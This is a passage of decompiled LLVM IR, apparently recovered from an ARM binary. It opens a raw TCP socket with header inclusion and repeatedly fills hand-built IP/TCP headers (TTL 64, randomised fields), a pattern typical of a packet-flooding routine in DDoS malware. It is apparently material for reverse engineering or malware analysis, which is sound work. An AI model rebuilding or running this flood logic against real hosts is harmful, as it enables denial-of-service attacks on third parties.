  store i32 %v0_89f4, i32* %r0.global-to-local, align 4
  %v6_89fc = inttoptr i32 %v0_89e8 to i32*
  %v7_89fc = call i32 @function_8570(i32 %v0_89f4, i32* %v6_89fc, i32 5, i32 1, i32 %v1_89e4)
  %v1_8a08 = urem i32 %v7_89fc, 256
  store i32 %v1_8a08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a14 = load i32, i32* @r5, align 4
  store i32 %v0_8a14, i32* %r1.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a20 = inttoptr i32 %v0_8a14 to i32*
  %v6_8a20 = call i32 @function_8570(i32 %v0_8a18, i32* %v5_8a20, i32 6, i32 65535, i32 %v1_8a08)
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a20, i32* @r8, align 4
  %v0_8a38 = load i32, i32* @r4, align 4
  store i32 %v0_8a38, i32* %r0.global-to-local, align 4
  %v5_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v6_8a3c = call i32 @function_8570(i32 %v0_8a38, i32* %v5_8a3c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a40 = load i32, i32* @r5, align 4
  store i32 %v0_8a40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a3c, i32* @r7, align 4
  %v0_8a50 = load i32, i32* @r4, align 4
  store i32 %v0_8a50, i32* %r0.global-to-local, align 4
  %v5_8a54 = inttoptr i32 %v0_8a40 to i32*
  %v6_8a54 = call i32 @function_8570(i32 %v0_8a50, i32* %v5_8a54, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a64 = load i32, i32* @r5, align 4
  store i32 %v0_8a64, i32* %r1.global-to-local, align 4
  %v0_8a68 = load i32, i32* @r4, align 4
  store i32 %v0_8a68, i32* %r0.global-to-local, align 4
  %v5_8a6c = inttoptr i32 %v0_8a64 to i32*
  %v6_8a6c = call i32 @function_8570(i32 %v0_8a68, i32* %v5_8a6c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8a74 = urem i32 %v6_8a6c, 256
  store i32 %v1_8a74, i32* %ip.global-to-local, align 4
  %v0_8a78 = load i32, i32* @r5, align 4
  store i32 %v0_8a78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8a84 = load i32, i32* @r4, align 4
  store i32 %v0_8a84, i32* %r0.global-to-local, align 4
  %v5_8a8c = inttoptr i32 %v0_8a78 to i32*
  %v6_8a8c = call i32 @function_8570(i32 %v0_8a84, i32* %v5_8a8c, i32 19, i32 0, i32 %v1_8a74)
  %v0_8a94 = load i32, i32* @r5, align 4
  store i32 %v0_8a94, i32* %r1.global-to-local, align 4
  %v2_8a98 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_8a98, i32* %r3.global-to-local, align 4
  store i32 %v6_8a8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r4, align 4
  store i32 %v0_8aa4, i32* %r0.global-to-local, align 4
  %v5_8aa8 = inttoptr i32 %v0_8a94 to i32*
  %v6_8aa8 = call i32 @function_8570(i32 %v0_8aa4, i32* %v5_8aa8, i32 25, i32 %v2_8a98, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8abc = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  %v7_8ac0 = icmp eq i32 %v3_8abc, -1
  store i1 %v7_8ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ac0, label %dec_label_pc_8fd4, label %dec_label_pc_8acc

dec_label_pc_8acc:                                ; preds = %dec_label_pc_896c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8ad4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8ad4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8ae8 = call i32 @function_115b0(i32 %v3_8abc, i32 0, i32 3, i32 %v6_8ad4, i32 4)
  store i32 %v5_8ae8, i32* %r0.global-to-local, align 4
  %v7_8aec = icmp eq i32 %v5_8ae8, -1
  store i1 %v7_8aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8aec, label %dec_label_pc_8fcc, label %dec_label_pc_8af4

dec_label_pc_8af4:                                ; preds = %dec_label_pc_8acc
  %v0_8af4 = load i32, i32* @r8, align 4
  %v0_8af8 = load i32, i32* @r7, align 4
  %v0_8afc = load i32, i32* %fp.global-to-local, align 4
  %v0_8b00 = load i32, i32* @r6, align 4
  %v1_8b00 = urem i32 %v0_8b00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b08 = urem i32 %v0_8af4, 65536
  store i32 %v3_8b08, i32* %r3.global-to-local, align 4
  %v3_8b0c = urem i32 %v0_8af8, 65536
  store i32 %v3_8b0c, i32* %r4.global-to-local, align 4
  %v0_8b10 = load i32, i32* @sl, align 4
  %v2_8b10 = icmp eq i32 %v0_8b10, 0
  store i1 %v2_8b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b28 = urem i32 %v0_8afc, 65536
  store i32 %v3_8b28, i32* @fp, align 4
  br i1 %v2_8b10, label %dec_label_pc_8fe0, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af4
  %v3_8af8 = mul i32 %v0_8af8, 65536
  %v3_8af4 = mul i32 %v0_8af4, 65536
  %v0_8afc.not = or i32 %v0_8afc, -65536
  %v1_8b3c = xor i32 %v0_8afc.not, 65535
  %v3_8b40 = mul i32 %v6_8a54, 65536
  %v1_8b44 = add i32 %v3_8b40, 4325376
  %tmp73 = udiv i32 %v1_8b44, 256
  %v3_8b58 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b3c, 256
  %v3_8b5c = and i32 %tmp74, 65280
  store i32 %v3_8b5c, i32* %ip.global-to-local, align 4
  %v1_8b60 = add i32 %v3_8b40, 524288
  %v1_8b68 = add i32 %v3_8b40, 1835008
  %tmp75 = udiv i32 %v1_8b3c, 256
  %v4_8b6c = urem i32 %tmp75, 256
  %v5_8b6c = or i32 %v4_8b6c, %v3_8b5c
  %v4_8b74 = udiv i32 %v1_8b44, 16777216
  %v5_8b74 = or i32 %v3_8b58, %v4_8b74
  store i32 %v5_8b74, i32* @r8, align 4
  %v3_8b80 = udiv i32 %v1_8b68, 256
  %tmp76 = mul i32 %v0_8afc, 256
  %v3_8b84 = and i32 %tmp76, 65280
  store i32 %v3_8af4, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8afc, 256
  %v4_8b94 = urem i32 %tmp77, 256
  %v5_8b94 = or i32 %v4_8b94, %v3_8b84
  store i32 %v5_8b94, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8af4, 256
  %v3_8b98 = and i32 %tmp78, 65280
  %v1_8b9c = and i32 %v3_8b80, 65280
  store i32 %v1_8b9c, i32* @r6, align 4
  store i32 %v3_8af8, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8af8, 256
  %v3_8ba8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8af4, 256
  %v4_8bac = urem i32 %tmp80, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b98
  store i32 %v5_8bac, i32* @lr, align 4
  %v4_8bb0 = udiv i32 %v1_8b68, 16777216
  %v5_8bb0 = or i32 %v1_8b9c, %v4_8bb0
  store i32 %v5_8bb0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8af8, 256
  %v4_8bb4 = urem i32 %tmp81, 256
  %v5_8bb4 = or i32 %v4_8bb4, %v3_8ba8
  %tmp82 = udiv i32 %v1_8b60, 256
  %v3_8bb8 = and i32 %tmp82, 65280
  store i32 %v3_8bb8, i32* @r5, align 4
  %v5_8bbc = trunc i32 %v5_8b94 to i16
  %v5_8bc4 = trunc i32 %v5_8bb0 to i16
  %v4_8bcc = udiv i32 %v1_8b60, 16777216
  %v5_8bcc = or i32 %v3_8bb8, %v4_8bcc
  store i32 %v5_8bcc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c34 = trunc i32 %v6_89dc to i8
  %sext = mul nuw i32 %v5_8b6c, 65536
  %v4_8cc0 = sdiv i32 %sext, 65536
  %v2_8cec = icmp eq i32 %v1_8b00, 0
  %sext8 = mul nuw i32 %v5_8bac, 65536
  %v4_8d0c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bb4, 65536
  %v4_8d14 = sdiv i32 %sext9, 65536
  %v1_8ccc27 = trunc i32 %v4_8cc0 to i16
  br label %dec_label_pc_8bd4

dec_label_pc_8bd4:                                ; preds = %bb85, %dec_label_pc_8b38
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8be0 = call i32 @function_1215c(i32 1510, i32 4)
  store i32 %v2_8be0, i32* %r0.global-to-local, align 4
  %v2_8be8 = load i32, i32* @r4, align 4
  %v5_8be8 = mul i32 %v2_8be8, 4
  %v6_8be8 = add i32 %v5_8be8, %v2_8988
  %v7_8be8 = inttoptr i32 %v6_8be8 to i32*
  store i32 %v2_8be0, i32* %v7_8be8, align 4
  %v3_8bec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bec, i32* %r2.global-to-local, align 4
  %v5_8bf4 = mul i32 %v3_8bec, 24
  %v1_8bf8 = load i32, i32* @sb, align 4
  %v2_8bf8 = add i32 %v1_8bf8, %v5_8bf4
  store i32 %v2_8bf8, i32* @lr, align 4
  store i32 %v2_8988, i32* %r3.global-to-local, align 4
  %v4_8c00 = mul i32 %v3_8bec, 4
  %v5_8c00 = add i32 %v4_8c00, %v2_8988
  %v6_8c00 = inttoptr i32 %v5_8c00 to i32*
  %v7_8c00 = load i32, i32* %v6_8c00, align 4
  store i32 %v7_8c00, i32* %r4.global-to-local, align 4
  %v1_8c04 = inttoptr i32 %v7_8c00 to i8*
  %v2_8c04 = load i8, i8* %v1_8c04, align 1
  %tmp = urem i8 %v2_8c04, 16
  %v1_8c08 = zext i8 %tmp to i32
  %v1_8c0c = or i32 %v1_8c08, 64
  store i32 %v1_8c0c, i32* %r3.global-to-local, align 4
  %v1_8c10 = trunc i32 %v1_8c0c to i8
  store i8 %v1_8c10, i8* %v1_8c04, align 1
  %v0_8c14 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c14 = inttoptr i32 %v0_8c14 to i8*
  %v2_8c14 = load i8, i8* %v1_8c14, align 1
  %v1_8c18 = and i8 %v2_8c14, -16
  %v1_8c1c = or i8 %v1_8c18, 5
  store i32 %v1_8a08, i32* %r5.global-to-local, align 4
  store i8 %v1_8c1c, i8* %v1_8c14, align 1
  store i32 %v6_89a0, i32* %r1.global-to-local, align 4
  %v2_8c2c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c2c = add i32 %v2_8c2c, 1
  %v4_8c2c = inttoptr i32 %v3_8c2c to i8*
  store i8 %v5_89c0, i8* %v4_8c2c, align 1
  store i32 %v1_89e4, i32* %r2.global-to-local, align 4
  %v2_8c34 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c34 = add i32 %v2_8c34, 8
  %v4_8c34 = inttoptr i32 %v3_8c34 to i8*
  store i8 %v1_8c34, i8* %v4_8c34, align 1
  %v2_8c3c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c3c = add i32 %v2_8c3c, 4
  %v4_8c3c = inttoptr i32 %v3_8c3c to i16*
  store i16 %v5_8bbc, i16* %v4_8c3c, align 2
  %v2_8c44 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c44 = add i32 %v2_8c44, 9
  %v4_8c44 = inttoptr i32 %v3_8c44 to i8*
  store i8 47, i8* %v4_8c44, align 1
  store i32 %v6_8aa8, i32* %r3.global-to-local, align 4
  %v0_8c4c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c4c = icmp eq i32 %v0_8c4c, 0
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c50 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c50 = add i32 %v1_8c50, 12
  %v3_8c50 = inttoptr i32 %v2_8c50 to i32*
  store i32 %v6_8aa8, i32* %v3_8c50, align 4
  br i1 %v2_8c4c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8bd4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c58 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c58 = add i32 %v3_8c58, 6
  %v5_8c58 = inttoptr i32 %v4_8c58 to i16*
  store i16 64, i16* %v5_8c58, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8bd4, %bb
  %v0_8c5c = load i32, i32* @lr, align 4
  %v1_8c5c = add i32 %v0_8c5c, 16
  %v2_8c5c = inttoptr i32 %v1_8c5c to i32*
  %v3_8c5c = load i32, i32* %v2_8c5c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8c64 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c64 = add i32 %v1_8c64, 16
  %v3_8c64 = inttoptr i32 %v2_8c64 to i32*
  store i32 %v3_8c5c, i32* %v3_8c64, align 4
  %v0_8c68 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c68 = add i32 %v0_8c68, 24
  store i32 %v1_8c68, i32* %r1.global-to-local, align 4
  %v1_8c6c = add i32 %v0_8c68, 20
  store i32 %v1_8c6c, i32* %r0.global-to-local, align 4
  %v0_8c70 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c70 = add i32 %v0_8c70, 101
  store i32 %v1_8c70, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8c7c = load i32, i32* @r8, align 4
  %v1_8c7c = trunc i32 %v0_8c7c to i16
  %v3_8c7c = add i32 %v0_8c68, 2
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v1_8c7c, i16* %v4_8c7c, align 2
  %v0_8c80 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c80 = trunc i32 %v0_8c80 to i16
  %v2_8c80 = load i32, i32* %r0.global-to-local, align 4
  %v3_8c80 = add i32 %v2_8c80, 2
  %v4_8c80 = inttoptr i32 %v3_8c80 to i16*
  store i16 %v1_8c80, i16* %v4_8c80, align 2
  %v0_8c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c84 = trunc i32 %v0_8c84 to i8
  %v2_8c84 = load i32, i32* %r1.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 13
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 %v1_8c84, i8* %v4_8c84, align 1
  %v0_8c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_8c88 = trunc i32 %v0_8c88 to i8
  %v2_8c88 = load i32, i32* %r1.global-to-local, align 4
  %v3_8c88 = add i32 %v2_8c88, 12
  %v4_8c88 = inttoptr i32 %v3_8c88 to i8*
  store i8 %v1_8c88, i8* %v4_8c88, align 1
  %v0_8c8c = load i32, i32* %r4.global-to-local, align 4
  %v1_8c8c = add i32 %v0_8c8c, 38
  %v2_8c8c = inttoptr i32 %v1_8c8c to i8*
  %v3_8c8c = load i8, i8* %v2_8c8c, align 1
  %tmp89 = urem i8 %v3_8c8c, 16
  %v1_8c90 = zext i8 %tmp89 to i32
  %v1_8c94 = or i32 %v1_8c90, 64
  store i32 %v1_8c94, i32* %r3.global-to-local, align 4
  %v1_8c98 = trunc i32 %v1_8c94 to i8
  store i8 %v1_8c98, i8* %v2_8c8c, align 1
  %v0_8c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_8c9c = add i32 %v0_8c9c, 38
  %v2_8c9c = inttoptr i32 %v1_8c9c to i8*
  %v3_8c9c = load i8, i8* %v2_8c9c, align 1
  %v1_8ca0 = and i8 %v3_8c9c, -16
  %v1_8ca4 = or i8 %v1_8ca0, 5
  store i8 %v1_8ca4, i8* %v2_8c9c, align 1
  %v0_8cb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 38
  store i32 %v1_8cb0, i32* @r5, align 4
  %v3_8cb4 = add i32 %v0_8cb0, 39
  %v4_8cb4 = inttoptr i32 %v3_8cb4 to i8*
  store i8 %v5_89c0, i8* %v4_8cb4, align 1
  store i32 %v5_8bb0, i32* %r2.global-to-local, align 4
  %v2_8cbc = load i32, i32* @r5, align 4
  %v3_8cbc = add i32 %v2_8cbc, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v5_8bc4, i16* %v4_8cbc, align 2
  store i32 %v4_8cc0, i32* %r3.global-to-local, align 4
  store i32 %v1_89e4, i32* %r1.global-to-local, align 4
  %v0_8cc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8cc8, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8ccc28 = load i32, i32* @r5, align 4
  %v3_8ccc29 = add i32 %v2_8ccc28, 4
  %v4_8ccc30 = inttoptr i32 %v3_8ccc29 to i16*
  store i16 %v1_8ccc27, i16* %v4_8ccc30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8ccc = load i32, i32* @r5, align 4
  %v3_8ccc = add i32 %v2_8ccc, 4
  %v4_8ccc = inttoptr i32 %v3_8ccc to i16*
  store i16 %v1_8ccc27, i16* %v4_8ccc, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8cd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_8cd4 = trunc i32 %v1_8cd4 to i16
  %v3_8cd4 = load i32, i32* @r5, align 4
  %v4_8cd4 = add i32 %v3_8cd4, 6
  %v5_8cd4 = inttoptr i32 %v4_8cd4 to i16*
  store i16 %v2_8cd4, i16* %v5_8cd4, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8cd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v0_8cd8 to i8
  %v2_8cd8 = load i32, i32* @r5, align 4
  %v3_8cd8 = add i32 %v2_8cd8, 8
  %v4_8cd8 = inttoptr i32 %v3_8cd8 to i8*
  store i8 %v1_8cd8, i8* %v4_8cd8, align 1
  %v0_8cdc = load i32, i32* %r3.global-to-local, align 4
  %v1_8cdc = trunc i32 %v0_8cdc to i8
  %v2_8cdc = load i32, i32* @r5, align 4
  %v3_8cdc = add i32 %v2_8cdc, 9
  %v4_8cdc = inttoptr i32 %v3_8cdc to i8*
  store i8 %v1_8cdc, i8* %v4_8cdc, align 1
  %v0_8ce0 = call i32 @function_e0b8()
  store i32 %v0_8ce0, i32* %r0.global-to-local, align 4
  store i32 %v1_8b00, i32* %r1.global-to-local, align 4
  store i1 %v2_8cec, i1* %cpsr_z.global-to-local, align 1
  %v1_8cf0 = sub i32 1023, %v0_8ce0
  store i32 %v1_8cf0, i32* %r3.global-to-local, align 4
  br i1 %v2_8cec, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8cf8 = load i32, i32* @r5, align 4
  %v3_8cf8 = add i32 %v2_8cf8, 16
  %v4_8cf8 = inttoptr i32 %v3_8cf8 to i32*
  store i32 %v1_8cf0, i32* %v4_8cf8, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8cf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8cf4 = add i32 %v1_8cf4, 16
  %v3_8cf4 = inttoptr i32 %v2_8cf4 to i32*
  %v4_8cf4 = load i32, i32* %v3_8cf4, align 4
  store i32 %v4_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 16
  %v4_8cfc = inttoptr i32 %v3_8cfc to i32*
  store i32 %v4_8cf4, i32* %v4_8cfc, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d00 = load i32, i32* @r5, align 4
  %v2_8d00 = add i32 %v1_8d00, 12
  %v3_8d00 = inttoptr i32 %v2_8d00 to i32*
  store i32 %v0_8ce0, i32* %v3_8d00, align 4
  %v3_8d04 = load i32, i32* %stack_var_-44, align 4
  %v0_8d08 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d08 = add i32 %v0_8d08, 58
  store i32 %v1_8d08, i32* @r6, align 4
  store i32 %v4_8d0c, i32* %r2.global-to-local, align 4
  %v1_8d10 = add i32 %v3_8d04, 1
  store i32 %v1_8d10, i32* @r4, align 4
  store i32 %v4_8d14, i32* %r3.global-to-local, align 4
  %v1_8d18 = load i32, i32* @sl, align 4
  %v9_8d18 = icmp eq i32 %v1_8d10, %v1_8d18
  store i1 %v9_8d18, i1* %cpsr_z.global-to-local, align 1
  %v0_8d1c = load i32, i32* @r7, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i16
  %v3_8d1c = add i32 %v0_8d08, 62
  %v4_8d1c = inttoptr i32 %v3_8d1c to i16*
  store i16 %v1_8d1c, i16* %v4_8d1c, align 2
  %v0_8d20 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d20 = trunc i32 %v0_8d20 to i16
  %v2_8d20 = load i32, i32* @r6, align 4
  %v3_8d20 = inttoptr i32 %v2_8d20 to i16*
  store i16 %v1_8d20, i16* %v3_8d20, align 2
  %v0_8d24 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d24 = trunc i32 %v0_8d24 to i16
  %v2_8d24 = load i32, i32* @r6, align 4
  %v3_8d24 = add i32 %v2_8d24, 2
  %v4_8d24 = inttoptr i32 %v3_8d24 to i16*
  store i16 %v1_8d24, i16* %v4_8d24, align 2
  %v0_8d28 = load i32, i32* @r4, align 4
  store i32 %v0_8d28, i32* %stack_var_-44, align 4
  %v5_8d2c = icmp slt i32 %v1_8d10, %v1_8d18
  br i1 %v5_8d2c, label %dec_label_pc_8bd4, label %dec_label_pc_8d30

dec_label_pc_8d30:                                ; preds = %bb85
  %v1_8d38 = add i32 %v6_8a54, 8
  store i32 %v1_8d38, i32* %r4.global-to-local, align 4
  %v1_8d3c = add i32 %v6_8a54, 66
  store i32 %v1_8d3c, i32* %r5.global-to-local, align 4
  %v0_8d4c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d48.preheader

dec_label_pc_8d48.preheader:                      ; preds = %dec_label_pc_8d30, %dec_label_pc_8fe0
  %v0_8d4c.pre = phi i32 [ %v0_8d4c.pre.pre, %dec_label_pc_8d30 ], [ 0, %dec_label_pc_8fe0 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d3c, %dec_label_pc_8d30 ], [ %v1_8fec, %dec_label_pc_8fe0 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d38, %dec_label_pc_8d30 ], [ %v1_8fe8, %dec_label_pc_8fe0 ]
  %v2_8f9c = icmp eq i32 %v1_8b00, 0
  %v2_8de4 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e0c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e18 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e2c = icmp eq i32 %v1_8a74, 0
  %v2_8d8c = icmp eq i32 %v6_8aa8, -1
  %v7_8d8c = icmp eq i32 %v6_8aa8, -1
  br label %dec_label_pc_8d48

dec_label_pc_8d48:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8e34, %dec_label_pc_8d48.preheader
  %v0_8d4c = phi i32 [ %v0_8d4c.pre, %dec_label_pc_8d48.preheader ], [ 0, %dec_label_pc_8d48 ], [ %v1_8ed0, %dec_label_pc_8e34 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d4c = icmp eq i32 %v0_8d4c, 0
  store i1 %v2_8d4c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d4c, label %dec_label_pc_8d48, label %dec_label_pc_8d58

dec_label_pc_8d58:                                ; preds = %dec_label_pc_8d48
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d5c

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8e34, %dec_label_pc_8d58
  %v1_8d70 = phi i32 [ %v1_8ecc, %dec_label_pc_8e34 ], [ 0, %dec_label_pc_8d58 ]
  %v5_8d60 = mul i32 %v1_8d70, 24
  %v1_8d64 = load i32, i32* @sb, align 4
  %v2_8d64 = add i32 %v1_8d64, %v5_8d60
  store i32 %v2_8d64, i32* %r3.global-to-local, align 4
  store i32 %v2_8988, i32* %r4.global-to-local, align 4
  %v1_8d6c = add i32 %v2_8d64, 20
  %v2_8d6c = inttoptr i32 %v1_8d6c to i8*
  %v3_8d6c = load i8, i8* %v2_8d6c, align 1
  %v4_8d6c = zext i8 %v3_8d6c to i32
  store i32 %v4_8d6c, i32* %r2.global-to-local, align 4
  %v4_8d70 = mul i32 %v1_8d70, 4
  %v5_8d70 = add i32 %v4_8d70, %v2_8988
  %v6_8d70 = inttoptr i32 %v5_8d70 to i32*
  %v7_8d70 = load i32, i32* %v6_8d70, align 4
  store i32 %v7_8d70, i32* @r5, align 4
  %v7_8d74 = icmp eq i8 %v3_8d6c, 31
  store i1 %v7_8d74, i1* %cpsr_z.global-to-local, align 1
  %v1_8d78 = add i32 %v7_8d70, 24
  store i32 %v1_8d78, i32* @r7, align 4
  %v1_8d7c = add i32 %v7_8d70, 38
  store i32 %v1_8d7c, i32* @r6, align 4
  %v1_8d80 = add i32 %v7_8d70, 58
  store i32 %v1_8d80, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8d6c, 32
  br i1 %tmp90, label %dec_label_pc_8ee0, label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d5c
  store i32 %v6_8aa8, i32* %r1.global-to-local, align 4
  store i1 %v7_8d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d8c, label %dec_label_pc_8f40, label %dec_label_pc_8d94

dec_label_pc_8d94:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8d88
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8d9c = load i32, i32* @fp, align 4
  %v9_8d9c = icmp eq i32 %v0_8d9c, 65535
  store i1 %v9_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8d9c, label %dec_label_pc_8f58, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge, %dec_label_pc_8d94
  %v1_8da8 = phi i32 [ %v1_8da8.pre, %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge ], [ 65535, %dec_label_pc_8d94 ]
  store i32 %v3_8b08, i32* %r2.global-to-local, align 4
  %v9_8da8 = icmp eq i32 %v3_8b08, %v1_8da8
  store i1 %v9_8da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8da8, label %dec_label_pc_8f80, label %dec_label_pc_8db0

dec_label_pc_8db0:                                ; preds = %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge, %dec_label_pc_8da4
  %v1_8db4 = phi i32 [ %v1_8db4.pre, %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge ], [ %v1_8da8, %dec_label_pc_8da4 ]
  store i32 %v3_8b0c, i32* %r3.global-to-local, align 4
  %v9_8db4 = icmp eq i32 %v3_8b0c, %v1_8db4
  store i1 %v9_8db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8db4, label %dec_label_pc_8f94, label %dec_label_pc_8dbc

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8db0
  store i32 %v1_8b00, i32* @r4, align 4
  store i1 %v2_8f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f9c, label %dec_label_pc_8fb0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dbc
  %v1_8dc4 = load i32, i32* @r5, align 4
  %v2_8dc4 = add i32 %v1_8dc4, 16
  %v3_8dc4 = inttoptr i32 %v2_8dc4 to i32*
  %v4_8dc4 = load i32, i32* %v3_8dc4, align 4
  store i32 %v4_8dc4, i32* %r3.global-to-local, align 4
  %v2_8dc8 = load i32, i32* @r6, align 4
  %v3_8dc8 = add i32 %v2_8dc8, 16
  %v4_8dc8 = inttoptr i32 %v3_8dc8 to i32*
  store i32 %v4_8dc4, i32* %v4_8dc8, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %bb88, %.thread11, %dec_label_pc_8fb0
  %v0_8dd0 = call i32 @function_e0b8()
  store i32 %v0_8dd0, i32* %r0.global-to-local, align 4
  store i32 %v0_8dd0, i32* %stack_var_-48, align 4
  %v0_8dd8 = call i32 @function_e0b8()
  store i32 %v0_8dd8, i32* %r0.global-to-local, align 4
  store i32 %v0_8dd8, i32* %stack_var_-52, align 4
